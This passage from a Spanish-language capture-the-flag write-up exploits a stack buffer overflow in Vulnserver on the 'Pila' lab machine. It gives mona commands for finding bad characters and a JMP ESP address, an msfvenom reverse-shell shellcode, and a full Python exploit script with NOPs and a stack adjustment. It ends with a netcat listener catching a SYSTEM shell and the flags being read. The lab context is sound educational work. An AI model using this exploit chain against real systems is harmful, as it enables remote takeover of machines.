<p align="center">
<img src="/assets/images/THL-writeup-pila/Captura26.png">
</p>

Podemos ver los bytes que mandamos.

Vamos a seleccionar el **ESP**, le damos click derecho y le damos a la opción **Follow in Dump** para ver los bytes que enviamos:

<p align="center">
<img src="/assets/images/THL-writeup-pila/Captura27.png">
</p>

Y ahí están los **Bytearrays**:

<p align="center">
<img src="/assets/images/THL-writeup-pila/Captura28.png">
</p>

Con esto, puedes ir comparando este resultado con el archivo **bytearrays.txt** para encontrar las **Badchars**, pero eso es muy tardado, por lo que vamos a usar **mona.py** para encontrarlos.

Tan simple es como indicarle que vamos a hacer una comparación (`compare`) de los bytes almacenados en el **ESP** (`-a 0xESP_Copiado`) y los **Bytearrays** que creamos (`C:\Path_byte_arrays\bytearray.bin`).

Que, en este caso, se resume al siguiente comando:
```bash
!mona compare -a 0xESP_Copiado -f C:\Users\Tu_usuario\Desktop\directorio_de_trabajo\bytearray.bin
```

<p align="center">
<img src="/assets/images/THL-writeup-pila/Captura29.png">
</p>

Excelente, no hay **Badchars**. 

En caso de que hubieran existido **Badchars**, tan solo tendríamos que generar otro archivo de **Bytearrays**, eliminando el **Badchar** como lo hicimos con el **null byte**.

Luego tendríamos que probar de nuevo, pues justo queremos que no existan **Badchars**.

#### Octavo Paso: Creación de Shellcode y Modificación de Exploit {#Octavo}

Vamos a iniciar la creación de nuestro Shellcode que vamos a inyectar y la creación del Exploit.

Primero, vamos a crear nuestro Shellcode:
```bash
msfvenom -p windows/shell_reverse_tcp --platform windows -a x86 LHOST=Tu_IP LPORT=443 -f c -e x86/shikata_ga_nai -b '\x00' EXITFUNC=thread
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of c file: 1506 bytes
unsigned char buf[] = 
"\xdb\xcd\xd9\x74\x24\xf4\xba\x7a\xe1\xd9\x25\x5e\x31\xc9"
"\xb1\x52\x31\x56\x17\x83\xc6\x04\x03\x2c\xf2\x3b\xd0\x2c"
...
...
...
```

Le indicamos a **msfvenom** lo siguiente:

| Parámetros | Descripción |
|---|---|
| `-p windows/shell_reverse_tcp` | Usa un payload para Windows que nos de una **Reverse Shell**. |
| `--platform windows -a x86` | El payload será para Windows de **arquitectura (-a) x86**. |
| `-f c` | El payload será hecho para **código C**. |
| `-e x86/shikata_ga_nai` | Usamos el encoder polimórfico **shikata ga nai** (esto lo hace por defecto, pero es bueno especificarlo). |
| `-b '\x00'` | Le indicamos que elimine un byte en específico. |
| `EXITFUNC=thread` | Le indicamos que cree un subproceso para que el servicio siga operativo. |

Ponemos el resultante en nuestro Exploit, quedando así:

```python
#!/usr/bin/python3

import socket

# Variables globales
ip_addr = "IP_máquina_windows"
port = 9999
offset = 2003
before_eip = b"A"*offset
eip = b"B"*4

shellcode =  (b"\xdb\xcd\xd9\x74\x24\xf4\xba\x7a\xe1\xd9\x25\x5e\x31\xc9"
b"\xb1\x52\x31\x56\x17\x83\xc6\x04\x03\x2c\xf2\x3b\xd0\x2c"
...
...
...

after_eip = shellcode

payload = b"TRUN /.:/" + before_eip + eip + after_eip

def exploit():

        # Creando conexión y enviando shellcode
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)

        s.connect((ip_addr, port))

        # Recibiendo banner
        banner = s.recv(1024)
        print(f"\n[+] Recibiendo Banner: \n------\n{banner.decode('utf-8', errors='ignore')}\n------\n")

        # Enviando payload
        s.send(payload)

        # Respuesta de servidor
        response = s.recv(1024)
        print(f"\n[+] Respuesta del servidor: {response.decode('utf-8', errors='ignore')}\n")

        # Cerrando conexión
        s.close()

if __name__ == '__main__':

        exploit()
```
Bien, ya estamos muy cerca de terminar.

#### Noveno Paso: Busqueda de OpCode para Aplicar un Salto (JMP) al ESP {#Noveno}

Recordemos que es un **OpCode**:

| **Operation Code** |
|:-----------:|
| *El opcode (abreviatura de "operation code" o código de operación) es una parte fundamental de una instrucción en lenguaje máquina. Es el segmento de la instrucción que le dice a la CPU qué operación debe realizar.* |

Necesitamos buscar un **OpCode** dentro del binario que nos ayude a escribir nuestro **Shellcode** para que se pueda ejecutar la **Reverse Shell**.

Para esto, usamos el **EIP** para que apunte a una dirección de memoria donde se aplique un **OpCode**, para que realice un salto (**JMP**) al **ESP**, que es donde queremos que se aplique el **Shellcode**.

Esto se le conoce como **JMP ESP**.

Una herramienta que podemos ocupar es **nasm_shell** de **Metasploit Framework**.

Podemos invocarla usando su ruta completa `/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb` y le indicamos que busque él `JMP ESP`:
```bash
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
nasm > jmp ESP
00000000  FFE4              jmp esp
```
El **OpCode** se representa así: `\xFF\xE4`.

Vamos a buscar este **OpCode** en **Immunity Debugger** con la ayuda del módulo **mona.py**.

Para hacer esto, necesitamos el **archivo DLL** que también descargamos, pues ahí buscaremos el **OpCode**.

Usa el siguiente comando:
```bash
!mona find -s "\xFF\xE4" -m essfunc.dll
```

<p align="center">
<img src="/assets/images/THL-writeup-pila/Captura30.png">
</p>

Observa que nos salieron varias direcciones.

Vamos a utilizar cualquiera de esas direcciones, yo utilizare la penúltima, así que cópiala y pégala en el Exploit, en la variable **EIP** que declaramos:
```python
from struct import pack
import socket  

# Variables globales
ip_addr = "IP_maquina_windows"
port = 9999
offset = 2003
before_eip = b"A"*offset
eip = pack("<L", 0x62501203)
```
Esa dirección que copiamos, está en formato **little endian**, ósea que está al revés porque se copió de un sistema de **32 bits (x86)**, por eso la pusimos dentro de la función **pack** e importamos esa librería.

Si entendí bien, esto es lo que realiza el script 5 del repositorio que descargamos.

Con esto listo, vamos a revisar como es el flujo del programa.

Lo haremos por pasos:

* **Paso 1**: Vamos a seguir la dirección que ocupamos en el Exploit, para esto, dale click en el botón **Enter Expression** y luego mete la dirección que escogiste. Cuando le des enter, verifica que sea la misma dirección que escogiste:

<p align="center">
<img src="/assets/images/THL-writeup-pila/Captura31.png">
</p>

<p align="center">
<img src="/assets/images/THL-writeup-pila/Captura32.png">
</p>

Observa como la dirección del **OpCode** es un **JMP ESP**.

* **Paso 2**: Selecciona esa dirección, da click derecho, busca la opción **breakpoint** y elige la opción **Toggle**.

<p align="center">
<img src="/assets/images/THL-writeup-pila/Captura33.png">
</p>

* **Paso 3**: Ejecuta el Exploit y observa si el **EIP** y la **OpCode** que elegiste tienen la misma dirección:

<p align="center">
<img src="/assets/images/THL-writeup-pila/Captura35.png">
</p>

Son las mismas, vamos muy bien.

* **Paso 4**: Ahora queremos ver el siguiente flujo, con tal de comprobar si la dirección del **EIP** es la misma que la del **ESP** y la del **OpCode**, esto lo haremos solamente eligiendo el botón **step into** y si las direcciones son las mismas, podremos ver nuestro **Shellcode** aplicando un **Follow in Dump** al **ESP** como hemos hecho antes:

<p align="center">
<img src="/assets/images/THL-writeup-pila/Captura36.png">
</p>

<p align="center">
<img src="/assets/images/THL-writeup-pila/Captura37.png">
</p>

<p align="center">
<img src="/assets/images/THL-writeup-pila/Captura38.png">
</p>

Ya casi terminamos.

#### Décimo Paso: Aplicando NOPs y Desplazamiento de Pila en Exploit {#Décimo}

Recordemos que son los **NOPs**:

| **No Operation (NOPs)** |
|:-----------:|
| *Los NOPs (del inglés No Operation, "sin operación") son instrucciones en lenguaje máquina o ensamblador que no realizan ninguna acción útil, excepto avanzar al siguiente ciclo de la CPU. Permiten que el procesador tenga tiempo adicional para interpretar el shellcode antes de continuar con la siguiente instrucción del programa.* |

Es muy simple, únicamente debemos agregar la siguiente instrucción que es para **arquitectura x86**:
```bash
b"\x90"
```
El **NOP**, se puede multiplicar por 16 o por 32, pero en nuestro caso, al no tener tantas instrucciones, podemos multiplicarlo por 16.

Esto lo podemos agregar al Exploit en la variable **after_eip** junto al **Shellcode**:
```python
after_eip = b"\x90"*16 + shellcode  # ESP = Combinación de NOPs con shellcode
```

Lo que sigue es aplicar el **desplazamiento de pila**, pero entendamos de que se trata este paso:

| **Desplazamiento de Pila (stack offset)** |
|:-----------:|
| *Un desplazamiento de pila (stack offset) se refiere al cambio de posición de un dato dentro de la pila de ejecución de un programa, ya sea por instrucciones del código, llamadas a funciones o por una manipulación no intencionada (como en un buffer overflow). La pila funciona con una estructura LIFO (Last In, First Out) y se maneja a través de registros como: ESP (Stack Pointer) que apunta a la cima de la pila y EBP (Base Pointer) que apunta a la base del frame de la función actual. * |

Ahora, para aplicar el **desplazamiento de pila**, debemos usar la herramienta **nasm_shell** de **Metasploit**, que ya usamos para obtener el **OpCode (JMP ESP)**, actívalo y escribe lo siguiente: `sub esp,0x10`:
```bash
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
nasm > sub esp,0x10
00000000  83EC10            sub esp,byte +0x10
nasm > exit
```

Lo que estamos haciendo, es decrementar el valor del **puntero de pila** de **16 bytes**.

Agrega esa dirección al Exploit y ejecútalo:
```python
payload = b"TRUN /.:/" + before_eip + eip + b"\x83\xEC\x10" + after_eip
```

Sigamos.

#### Undécimo Paso: Prueba y Ejecución de Exploit {#Undecimo}

En este punto, el Exploit debería quedarte así:

```python
#!/usr/bin/python3

from struct import pack
import socket

# Variables globales
ip_addr = "IP_maquina_windows"
port = 9999
offset = 2003
before_eip = b"A"*offset
eip = pack("<L", 0x62501203)

shellcode =  (b"\xdb\xcd\xd9\x74\x24\xf4\xba\x7a\xe1\xd9\x25\x5e\x31\xc9"
b"\xb1\x52\x31\x56\x17\x83\xc6\x04\x03\x2c\xf2\x3b\xd0\x2c"
b"\x1c\x39\x1b\xcc\xdd\x5e\x95\x29\xec\x5e\xc1\x3a\x5f\x6f"
...
...
...
...

after_eip = b"\x90"*16 + shellcode

payload = b"TRUN /.:/" + before_eip + eip + b"\x83\xEC\x10" + after_eip

def exploit():

        # Creando conexión y enviando shellcode
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip_addr, port))

        # Recibiendo banner
        banner = s.recv(1024)
        print(f"\n[+] Recibiendo Banner: \n------\n{banner.decode('utf-8', errors='ignore')}\n------\n")

        # Enviando payload
        s.send(payload)

        # Cerrando conexión
        s.close()

if __name__ == '__main__':

        exploit()
```
En este caso, puedes probar con tu **máquina virtual Windows** o ya con la **máquina víctima** que esta ejecutando el binario.

Yo lo probaré con mi **máquina virtual Windows**.

Abre una **netcat** en conjunto con la herramienta **rlwrap**:
```bash
rlwrap nc -nlvp 443
listening on [any] 443 ...
```

Ejecuta el Exploit:

```bash
python3 exploitVulnserver.py

[+] Recibiendo Banner: 
------
Welcome to Vulnerable Server! Enter HELP for help.

------
```

Observa la **netcat**:
```bash
rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [Mi_IP] from (UNKNOWN) [IP_maquina_virtual_Windows] 49255
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\berserkw\Desktop\Vulnserver>whoami
whoami
berserkw-pc\berserkw
```
Genial, funciono correctamente.

Podemos decir que hemos hecho una prueba exitosa de **Buffer Overflow**.

Ya solo ejecutemos el Exploit contra la máquina víctima y observa a donde nos manda:
```batch
rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.1.100] 49158
Microsoft Windows [Versi�n 6.0.6001]
Copyright (c) 2006 Microsoft Corporation.  Reservados todos los derechos.
.
C:\Users\Administrador\Desktop>whoami
whoami
nt authority\system
```
Resulta que el **Administrador** era quien estaba ejecutando el binario.

Ya solo tenemos que buscar las flags.

Veamos primero la del **Administrador**:

```batch
C:\Users\Administrador\Desktop>dir
dir
 El volumen de la unidad C no tiene etiqueta.
 El n�mero de serie del volumen es: 640F-86BF

 Directorio de C:\Users\Administrador\Desktop

21/07/2024  18:46    <DIR>          .
21/07/2024  18:46    <DIR>          ..
21/07/2024  18:00             1.646 essfunc.c
21/07/2024  18:00            16.601 essfunc.dll
21/07/2024  18:46                36 root.txt
21/07/2024  18:00             9.033 vulnserver.c
21/07/2024  17:59            29.624 vulnserver.exe
               5 archivos         56.940 bytes
               2 dirs  16.631.238.656 bytes libres

C:\Users\Administrador\Desktop>type root.txt
type root.txt
...
```

Y por último, busquemos la del usuario:

```batch
C:\Users>dir
dir
 El volumen de la unidad C no tiene etiqueta.
 El n�mero de serie del volumen es: 640F-86BF

 Directorio de C:\Users

21/07/2024  18:29    <DIR>          .
21/07/2024  18:29    <DIR>          ..
21/07/2024  17:38    <DIR>          Administrador
21/07/2024  18:29    <DIR>          Pila
19/01/2008  10:40    <DIR>          Public
               0 archivos              0 bytes
               5 dirs  16.631.238.656 bytes libres

C:\Users>cd Pila/Desktop
cd Pila/Desktop

C:\Users\Pila\Desktop>dir
dir
 El volumen de la unidad C no tiene etiqueta.
 El n�mero de serie del volumen es: 640F-86BF

 Directorio de C:\Users\Pila\Desktop

21/07/2024  18:47    <DIR>          .
21/07/2024  18:47    <DIR>          ..
21/07/2024  18:46                36 user.txt
               1 archivos             36 bytes
               2 dirs  16.631.238.656 bytes libres

C:\Users\Pila\Desktop>type user.txt
type user.txt
...
```
Con esto, hemos completado la máquina.
